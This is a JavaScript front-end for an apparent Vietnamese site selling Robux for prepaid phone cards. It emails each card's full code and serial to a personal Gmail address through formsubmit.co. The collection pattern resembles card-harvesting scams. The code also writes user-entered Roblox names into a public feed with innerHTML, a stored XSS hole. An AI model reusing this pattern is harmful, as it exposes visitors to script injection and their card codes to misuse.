firebase.initializeApp({
  apiKey: "YOUR_API_KEY",
  authDomain: "YOUR_DOMAIN",
  projectId: "YOUR_PROJECT_ID"
});

const auth = firebase.auth();
const db   = firebase.firestore();

homeBtn.onclick = () => {
  home.classList.remove("hidden");
  history.classList.add("hidden");
  homeBtn.classList.add("active");
  historyBtn.classList.remove("active");
};

historyBtn.onclick = () => {
  home.classList.add("hidden");
  history.classList.remove("hidden");
  historyBtn.classList.add("active");
  homeBtn.classList.remove("active");
  loadHistory();
};

loginBtn.onclick = () => {
  auth.signInWithPopup(new firebase.auth.GoogleAuthProvider());
};

let lastSubmit = 0;

submit.onclick = async () => {
  if(Date.now() - lastSubmit < 8000){
    alert("Vui lòng chờ vài giây");
    return;
  }
  lastSubmit = Date.now();

  const data = {
    roblox: roblox.value,
    package: package.value,
    cardType: cardType.value,
    cardValue: cardValue.value,
    code: cardCode.value,
    serial: cardSerial.value
  };

  if(Object.values(data).some(v => !v)){
    alert("Vui lòng nhập đầy đủ thông tin");
    return;
  }

  fetch("https://formsubmit.co/ajax/minhtrankhai131110@gmail.com",{
    method:"POST",
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
      subject:"Đơn Robux",
      message:
        `Roblox: ${data.roblox}
Gói: ${data.package}
Nhà mạng: ${data.cardType}
Mệnh giá: ${data.cardValue}
Mã: ${data.code}
Serial: ${data.serial}`
    })
  });

  const u = auth.currentUser;
  if(u){
    await db.collection("orders").add({
      uid: u.uid,
      roblox: data.roblox,
      package: data.package,
      cardValue: data.cardValue,
      code: "***" + data.code.slice(-3),
      serial: "***" + data.serial.slice(-3),
      time: Date.now()
    });
  }

  alert("Đã gửi đơn!");
};

async function loadHistory(){
  historyList.innerHTML = "";
  const u = auth.currentUser;
  if(!u) return;

  const q = await db.collection("orders")
    .where("uid","==",u.uid)
    .orderBy("time","desc")
    .get();

  q.forEach(d=>{
    const o = d.data();
    historyList.innerHTML +=
      `<div class="item">${o.roblox} • ${o.package} • ${o.cardValue}</div>`;
  });
}

db.collection("orders")
  .orderBy("time","desc")
  .limit(5)
  .onSnapshot(s=>{
    recentList.innerHTML="";
    s.forEach(d=>{
      const o=d.data();
      const name = o.roblox.slice(0,2) + "***";
      recentList.innerHTML +=
        `<div class="item">${name} vừa nạp ${o.package}</div>`;
    });
  });
